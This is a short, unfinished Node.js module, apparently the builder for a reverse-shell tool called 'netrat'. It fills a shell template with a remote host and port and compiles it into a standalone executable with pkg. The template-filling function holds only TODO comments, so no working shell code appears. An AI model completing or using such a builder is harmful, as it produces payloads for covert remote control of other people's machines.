const debug = require('debug')('netrat')
const path = require('path')
const exec = require('pkg').exec
const SEED = path.join(__dirname, 'seed', 'shell.template')
var OUT_NAME = 'netrat'

function builder (opt, destination) {
  // options: {os, rhost, rport, retry, architecture, nodeVersion}
  var stubPath = genStubFromTemplate(SEED, opt)

  OUT_NAME += (opt.os === 'win') ? '.exe' : ''
  var pkgArgs = ['--target', `node${opt.nodeVersion}-${opt.os}-${opt.architecture}`, '--output', path.join(destination, OUT_NAME)]
  startPkg(stubPath, pkgArgs)
}

function startPkg (stubPath, args) {
  var input = [stubPath].concat(args)
  exec(input).then(success).catch(fail)
}

function genStubFromTemplate (template, opt) {
  // TODO: use sync operation
  // TODO: replace marker with the values
  // TODO: save intermediate result into /tmp dir.

  // TODO: return path to the /{tmp}/netrat-shell.js
}

function success (out) {
  // TODO: output from the pkg exec.
  console.log(out)

}

function fail (err) {
  // TODO: err from pkg exec. (boxen red border..)
  console.log(err)

}

module.exports = builder
